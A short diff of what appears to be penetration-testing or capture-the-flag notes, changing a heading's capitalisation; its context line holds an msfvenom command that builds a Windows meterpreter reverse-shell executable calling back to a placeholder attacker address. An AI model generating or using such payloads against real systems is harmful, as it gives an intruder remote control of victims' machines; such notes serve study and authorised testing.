@@ -1,4 +1,4 @@
-# Preparation
+# PREPARATION
 
 #### 1) msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ATTACK_IP lport=PORT -f exe > shell.exe
 
